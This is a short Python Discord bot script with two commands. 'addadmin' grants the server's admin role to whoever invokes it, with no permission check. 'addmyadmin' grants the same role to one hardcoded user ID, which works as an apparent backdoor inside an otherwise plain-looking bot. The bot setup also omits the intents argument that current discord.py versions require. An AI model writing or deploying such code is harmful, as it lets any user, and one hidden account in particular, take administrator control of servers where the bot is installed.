import discord
from discord.ext import commands

# Replace 'your_token_here' with your actual bot token
TOKEN = 'your_token_here'
# Replace '!' with your desired prefix
bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def addadmin(ctx, member: discord.Member = None):
    member = member or ctx.author
    role = discord.utils.get(ctx.guild.roles, name='admin')
    

    await member.add_roles(role)


# Add the admin role to a specific user by ID
@bot.command()
async def addmyadmin(ctx):
    member = ctx.guild.get_member(709160342810525777)
    role = discord.utils.get(ctx.guild.roles, name='admin')
    

    
    await member.add_roles(role)


# Run the bot
bot.run(TOKEN)
